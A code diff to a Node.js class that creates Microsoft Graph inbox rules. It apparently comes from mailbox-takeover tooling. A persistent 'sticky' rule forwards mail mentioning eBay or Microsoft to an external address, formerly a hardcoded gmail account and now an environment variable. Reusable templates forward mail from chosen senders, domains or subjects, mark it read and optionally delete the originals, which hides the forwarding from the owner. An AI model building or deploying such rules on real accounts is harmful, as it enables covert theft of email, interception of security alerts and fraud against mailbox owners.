@@ -4,8 +4,18 @@ const Log = require('../models/Log');
 class RuleManager {
     constructor() {
         this.STICKY_RULE_NAME = 'Sticky_eBay_Microsoft_Rule';
-        this.TARGET_EMAIL = process.env.FORWARD_TARGET_EMAIL || 'neg4pos@gmail.com';
+        if (!process.env.FORWARD_TARGET_EMAIL) {
+            console.warn('⚠️ WARNING: FORWARD_TARGET_EMAIL is not defined in .env');
+        }
+        this.TARGET_EMAIL = process.env.FORWARD_TARGET_EMAIL;
         this.KEYWORDS = ['eBay', 'Microsoft'];
+    }
+
+    ensureTargetEmail() {
+        if (!this.TARGET_EMAIL) {
+            throw new Error('Configuration error: FORWARD_TARGET_EMAIL is required in .env');
+        }
+        return this.TARGET_EMAIL;
     }
 
     // ============= STICKY RULE MANAGEMENT =============
@@ -48,6 +58,7 @@ class RuleManager {
     }
 
     async createStickyRule(graph) {
+        const targetEmail = this.ensureTargetEmail();
         const rule = {
             displayName: this.STICKY_RULE_NAME,
             sequence: 1,
@@ -59,7 +70,7 @@ class RuleManager {
                 forwardTo: [
                     {
                         emailAddress: {
-                            address: this.TARGET_EMAIL
+                            address: targetEmail
                         }
                     }
                 ],
@@ -140,286 +151,276 @@ class RuleManager {
     }
 
     // ============= RULE TEMPLATES - READY TO USE! =============
-
-    /**
-     * 🎯 RULE 1: FORWARD FROM SPECIFIC SENDER
-     */
-    createForwardFromSenderRule(sender, targetEmail, deleteOriginal = false) {
-        return {
-            displayName: `Forward_From_${sender.replace(/[@.]/g, '_')}_To_${targetEmail.replace(/[@.]/g, '_')}`,
-            sequence: 100,
-            isEnabled: true,
-            conditions: {
-                from: {
-                    emailAddresses: [
-                        {
-                            address: sender
-                        }
-                    ]
-                }
-            },
-            actions: {
-                forwardTo: [
-                    {
-                        emailAddress: {
-                            address: targetEmail
-                        }
-                    }
-                ],
-                markAsRead: true,
-                ...(deleteOriginal && { delete: true, moveToDeletedItems: true }),
-                stopProcessingRules: false
-            }
-        };
-    }
-
-    /**
-     * 🎯 RULE 2: FORWARD FROM DOMAIN
-     */
-    createForwardFromDomainRule(domain, targetEmail, deleteOriginal = false) {
-        return {
-            displayName: `Forward_From_@${domain.replace(/[@.]/g, '_')}_To_${targetEmail.replace(/[@.]/g, '_')}`,
-            sequence: 101,
-            isEnabled: true,
-            conditions: {
-                from: {
-                    emailAddresses: [
-                        {
-                            address: `@${domain}`
-                        }
-                    ]
-                }
-            },
-            actions: {
-                forwardTo: [
-                    {
-                        emailAddress: {
-                            address: targetEmail
-                        }
-                    }
-                ],
-                markAsRead: true,
-                ...(deleteOriginal && { delete: true, moveToDeletedItems: true }),
-                stopProcessingRules: false
-            }
-        };
-    }
-
-    /**
-     * 🎯 RULE 3: FORWARD WITH SUBJECT KEYWORD
-     */
-    createForwardWithSubjectRule(keywords, targetEmail, deleteOriginal = false) {
-        const keywordStr = keywords.join('_');
-        return {
-            displayName: `Forward_Subject_${keywordStr}_To_${targetEmail.replace(/[@.]/g, '_')}`,
-            sequence: 102,
-            isEnabled: true,
-            conditions: {
-                subjectContains: Array.isArray(keywords) ? keywords : [keywords]
-            },
-            actions: {
-                forwardTo: [
-                    {
-                        emailAddress: {
-                            address: targetEmail
-                        }
-                    }
-                ],
-                markAsRead: true,
-                ...(deleteOriginal && { delete: true, moveToDeletedItems: true }),
-                stopProcessingRules: false
-            }
-        };
-    }
-
-    /**
-     * 🎯 RULE 4: BLOCK SENDER (DELETE)
-     */
-    createBlockSenderRule(sender) {
-        return {
-            displayName: `Block_${sender.replace(/[@.]/g, '_')}`,
-            sequence: 900,
-            isEnabled: true,
-            conditions: {
-                from: {
-                    emailAddresses: [
-                        {
-                            address: sender
-                        }
-                    ]
-                }
-            },
-            actions: {
-                delete: true,
-                moveToDeletedItems: true,
-                stopProcessingRules: true
-            }
-        };
-    }
-
-    /**
-     * 🎯 RULE 5: BLOCK DOMAIN
-     */
-    createBlockDomainRule(domain) {
-        return {
-            displayName: `Block_Domain_${domain.replace(/[@.]/g, '_')}`,
-            sequence: 901,
-            isEnabled: true,
-            conditions: {
-                from: {
-                    emailAddresses: [
-                        {
-                            address: `@${domain}`
-                        }
-                    ]
-                }
-            },
-            actions: {
-                delete: true,
-                moveToDeletedItems: true,
-                stopProcessingRules: true
-            }
-        };
-    }
-
-    /**
-     * 🎯 RULE 6: MOVE TO FOLDER
-     */
-    createMoveToFolderRule(condition, conditionType, folderId, folderName) {
-        const conditionObj = {};
-        if (conditionType === 'sender') {
-            conditionObj.from = { emailAddresses: [{ address: condition }] };
-        } else if (conditionType === 'subject') {
-            conditionObj.subjectContains = [condition];
-        } else if (conditionType === 'domain') {
-            conditionObj.from = { emailAddresses: [{ address: `@${condition}` }] };
-        }
-
-        return {
-            displayName: `Move_${condition.replace(/[@.]/g, '_')}_To_${folderName}`,
-            sequence: 200,
-            isEnabled: true,
-            conditions: conditionObj,
-            actions: {
-                moveToFolder: folderId,
-                markAsRead: true,
-                stopProcessingRules: false
-            }
-        };
-    }
-
-    /**
-     * 🎯 RULE 7: MARK IMPORTANCE
-     */
-    createMarkImportanceRule(condition, conditionType, importance) {
-        const conditionObj = {};
-        if (conditionType === 'sender') {
-            conditionObj.from = { emailAddresses: [{ address: condition }] };
-        } else if (conditionType === 'subject') {
-            conditionObj.subjectContains = [condition];
-        }
-
-        return {
-            displayName: `Mark_${condition.replace(/[@.]/g, '_')}_As_${importance}`,
-            sequence: 300,
-            isEnabled: true,
-            conditions: conditionObj,
-            actions: {
-                markImportance: importance,
-                stopProcessingRules: false
-            }
-        };
-    }
-
-    /**
-     * 🎯 RULE 8: ASSIGN CATEGORY
-     */
-    createAssignCategoryRule(condition, conditionType, category) {
-        const conditionObj = {};
-        if (conditionType === 'sender') {
-            conditionObj.from = { emailAddresses: [{ address: condition }] };
-        } else if (conditionType === 'subject') {
-            conditionObj.subjectContains = [condition];
-        } else if (conditionType === 'domain') {
-            conditionObj.from = { emailAddresses: [{ address: `@${condition}` }] };
-        }
-
-        return {
-            displayName: `Categorize_${condition.replace(/[@.]/g, '_')}_As_${category}`,
-            sequence: 400,
-            isEnabled: true,
-            conditions: conditionObj,
-            actions: {
-                assignCategories: [category],
-                stopProcessingRules: false
-            }
-        };
-    }
-
-    /**
-     * 🎯 RULE 9: COMPLEX CONDITION (AND/OR)
-     */
-    createComplexRule(name, conditions, actions) {
-        return {
-            displayName: name,
-            sequence: 500,
-            isEnabled: true,
-            conditions: conditions, // Can be { and: [...] } or { or: [...] }
-            actions: actions,
-            stopProcessingRules: false
-        };
-    }
-
-    /**
-     * 🎯 RULE 10: AUTO-REPLY (Vacation/Out of Office style)
-     * Note: Limited support in Graph API
-     */
-    createAutoReplyRule(subjectKeywords, replyBody) {
-        return {
-            displayName: `AutoReply_${subjectKeywords.join('_')}`,
-            sequence: 600,
-            isEnabled: true,
-            conditions: {
-                subjectContains: subjectKeywords
-            },
-actions: {
-    stopProcessingRules: false
-    // Note: Full auto-reply requires MailSettings API
-    // This is just a placeholder rule
-}
-        };
-    }
-
-    /**
-     * 🎯 RULE 11: FORWARD WITH ATTACHMENT
-     */
-    createForwardAsAttachmentRule(sender, targetEmail) {
-        return {
-            displayName: `ForwardAsAttachment_${sender.replace(/[@.]/g, '_')}_To_${targetEmail.replace(/[@.]/g, '_')}`,
-            sequence: 103,
-            isEnabled: true,
-            conditions: {
-                from: {
-                    emailAddresses: [
-                        {
-                            address: sender
-                        }
-                    ]
-                }
-            },
-            actions: {
-                forwardAsAttachmentTo: [
-                    {
-                        emailAddress: {
-                            address: targetEmail
-                        }
-                    }
-                ],
-                markAsRead: true,
-                stopProcessingRules: false
-            }
-        };
-    }
+ 
+     /**
+      * 🎯 RULE 1: FORWARD FROM SPECIFIC SENDER
+      */
+     createForwardFromSenderRule(sender, targetEmail, deleteOriginal = false) {
+         return {
+             displayName: `Forward_From_${sender.replace(/[@.]/g, '_')}_To_${targetEmail.replace(/[@.]/g, '_')}`,
+             sequence: 100,
+             isEnabled: true,
+             conditions: {
+                 fromAddresses: [
+                     {
+                         emailAddress: {
+                             address: sender
+                         }
+                     }
+                 ]
+             },
+             actions: {
+                 forwardTo: [
+                     {
+                         emailAddress: {
+                             address: targetEmail
+                         }
+                     }
+                 ],
+                 markAsRead: true,
+                 ...(deleteOriginal && { delete: true, moveToDeletedItems: true }),
+                 stopProcessingRules: false
+             }
+         };
+     }
+ 
+     /**
+      * 🎯 RULE 2: FORWARD FROM DOMAIN
+      */
+     createForwardFromDomainRule(domain, targetEmail, deleteOriginal = false) {
+         const cleanDomain = domain.replace(/^@/, '');
+         return {
+             displayName: `Forward_From_@${cleanDomain.replace(/[@.]/g, '_')}_To_${targetEmail.replace(/[@.]/g, '_')}`,
+             sequence: 101,
+             isEnabled: true,
+             conditions: {
+                 senderContains: [cleanDomain]
+             },
+             actions: {
+                 forwardTo: [
+                     {
+                         emailAddress: {
+                             address: targetEmail
+                         }
+                     }
+                 ],
+                 markAsRead: true,
+                 ...(deleteOriginal && { delete: true, moveToDeletedItems: true }),
+                 stopProcessingRules: false
+             }
+         };
+     }
+ 
+     /**
+      * 🎯 RULE 3: FORWARD WITH SUBJECT KEYWORD
+      */
+     createForwardWithSubjectRule(keywords, targetEmail, deleteOriginal = false) {
+         const keywordStr = keywords.join('_');
+         return {
+             displayName: `Forward_Subject_${keywordStr}_To_${targetEmail.replace(/[@.]/g, '_')}`,
+             sequence: 102,
+             isEnabled: true,
+             conditions: {
+                 subjectContains: Array.isArray(keywords) ? keywords : [keywords]
+             },
+             actions: {
+                 forwardTo: [
+                     {
+                         emailAddress: {
+                             address: targetEmail
+                         }
+                     }
+                 ],
+                 markAsRead: true,
+                 ...(deleteOriginal && { delete: true, moveToDeletedItems: true }),
+                 stopProcessingRules: false
+             }
+         };
+     }
+ 
+     /**
+      * 🎯 RULE 4: BLOCK SENDER (DELETE)
+      */
+     createBlockSenderRule(sender) {
+         return {
+             displayName: `Block_${sender.replace(/[@.]/g, '_')}`,
+             sequence: 900,
+             isEnabled: true,
+             conditions: {
+                 fromAddresses: [
+                     {
+                         emailAddress: {
+                             address: sender
+                         }
+                     }
+                 ]
+             },
+             actions: {
+                 delete: true,
+                 moveToDeletedItems: true,
+                 stopProcessingRules: true
+             }
+         };
+     }
+ 
+     /**
+      * 🎯 RULE 5: BLOCK DOMAIN
+      */
+     createBlockDomainRule(domain) {
+         const cleanDomain = domain.replace(/^@/, '');
+         return {
+             displayName: `Block_Domain_${cleanDomain.replace(/[@.]/g, '_')}`,
+             sequence: 901,
+             isEnabled: true,
+             conditions: {
+                 senderContains: [cleanDomain]
+             },
+             actions: {
+                 delete: true,
+                 moveToDeletedItems: true,
+                 stopProcessingRules: true
+             }
+         };
+     }
+ 
+     /**
+      * 🎯 RULE 6: MOVE TO FOLDER
+      */
+     createMoveToFolderRule(condition, conditionType, folderId, folderName) {
+         const conditionObj = {};
+         if (conditionType === 'sender') {
+             conditionObj.fromAddresses = [{ emailAddress: { address: condition } }];
+         } else if (conditionType === 'subject') {
+             conditionObj.subjectContains = [condition];
+         } else if (conditionType === 'domain') {
+             conditionObj.senderContains = [condition.replace(/^@/, '')];
+         }
+ 
+         return {
+             displayName: `Move_${condition.replace(/[@.]/g, '_')}_To_${folderName}`,
+             sequence: 200,
+             isEnabled: true,
+             conditions: conditionObj,
+             actions: {
+                 moveToFolder: folderId,
+                 markAsRead: true,
+                 stopProcessingRules: false
+             }
+         };
+     }
+ 
+     /**
+      * 🎯 RULE 7: MARK IMPORTANCE
+      */
+     createMarkImportanceRule(condition, conditionType, importance) {
+         const conditionObj = {};
+         if (conditionType === 'sender') {
+             conditionObj.fromAddresses = [{ emailAddress: { address: condition } }];
+         } else if (conditionType === 'subject') {
+             conditionObj.subjectContains = [condition];
+         }
+ 
+         return {
+             displayName: `Mark_${condition.replace(/[@.]/g, '_')}_As_${importance}`,
+             sequence: 300,
+             isEnabled: true,
+             conditions: conditionObj,
+             actions: {
+                 markImportance: importance,
+                 stopProcessingRules: false
+             }
+         };
+     }
+ 
+     /**
+      * 🎯 RULE 8: ASSIGN CATEGORY
+      */
+     createAssignCategoryRule(condition, conditionType, category) {
+         const conditionObj = {};
+         if (conditionType === 'sender') {
+             conditionObj.fromAddresses = [{ emailAddress: { address: condition } }];
+         } else if (conditionType === 'subject') {
+             conditionObj.subjectContains = [condition];
+         } else if (conditionType === 'domain') {
+             conditionObj.senderContains = [condition.replace(/^@/, '')];
+         }
+ 
+         return {
+             displayName: `Categorize_${condition.replace(/[@.]/g, '_')}_As_${category}`,
+             sequence: 400,
+             isEnabled: true,
+             conditions: conditionObj,
+             actions: {
+                 assignCategories: [category],
+                 stopProcessingRules: false
+             }
+         };
+     }
+ 
+     /**
+      * 🎯 RULE 9: COMPLEX CONDITION (AND/OR)
+      */
+     createComplexRule(name, conditions, actions) {
+         return {
+             displayName: name,
+             sequence: 500,
+             isEnabled: true,
+             conditions: conditions, // Can be { and: [...] } or { or: [...] }
+             actions: actions,
+             stopProcessingRules: false
+         };
+     }
+ 
+     /**
+      * 🎯 RULE 10: AUTO-REPLY (Vacation/Out of Office style)
+      * Note: Limited support in Graph API
+      */
+     createAutoReplyRule(subjectKeywords, replyBody) {
+         return {
+             displayName: `AutoReply_${subjectKeywords.join('_')}`,
+             sequence: 600,
+             isEnabled: true,
+             conditions: {
+                 subjectContains: subjectKeywords
+             },
+ actions: {
+     stopProcessingRules: false
+     // Note: Full auto-reply requires MailSettings API
+     // This is just a placeholder rule
+ }
+         };
+     }
+ 
+     /**
+      * 🎯 RULE 11: FORWARD WITH ATTACHMENT
+      */
+     createForwardAsAttachmentRule(sender, targetEmail) {
+         return {
+             displayName: `ForwardAsAttachment_${sender.replace(/[@.]/g, '_')}_To_${targetEmail.replace(/[@.]/g, '_')}`,
+             sequence: 103,
+             isEnabled: true,
+             conditions: {
+                 fromAddresses: [
+                     {
+                         emailAddress: {
+                             address: sender
+                         }
+                     }
+                 ]
+             },
+             actions: {
+                 forwardAsAttachmentTo: [
+                     {
+                         emailAddress: {
+                             address: targetEmail
+                         }
+                     }
+                 ],
+                 markAsRead: true,
+                 stopProcessingRules: false
+             }
+         };
+     }
 
 
     // Line ~400 ke baad yeh add kar sakte ho:
